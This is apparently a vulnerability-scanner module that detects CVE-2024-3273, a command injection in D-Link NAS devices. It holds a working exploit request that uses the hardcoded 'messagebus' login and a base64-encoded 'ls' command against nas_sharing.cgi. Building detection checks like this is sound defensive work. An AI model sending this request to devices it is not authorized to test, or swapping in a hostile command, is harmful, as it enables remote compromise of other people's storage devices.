"""Agent Asteroid implementation for CVE-2024-3273"""

import re

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "D-Link Multiple NAS Devices Command Injection Vulnerability"
VULNERABILITY_REFERENCE = "CVE-2024-3273"
VULNERABILITY_DESCRIPTION = (
    "D-Link DNS-320L, DNS-325, DNS-327L, and DNS-340L contain a command injection vulnerability. "
    "When combined with CVE-2024-3272, this can lead to remote, unauthorized code execution."
)
RISK_RATING = "CRITICAL"


@exploits_registry.register
class CVE20243273Exploit(webexploit.WebExploit):
    accept_request = definitions.Request(method="GET", path="/")
    check_request = definitions.Request(
        method="GET",
        path="/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=bHMK",
    )
    accept_pattern = [re.compile("/web/relogin.html")]
    match_pattern = [re.compile("account_mgr.cgi")]
    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
        cve_ids=["CVE-2024-3273"],
    )
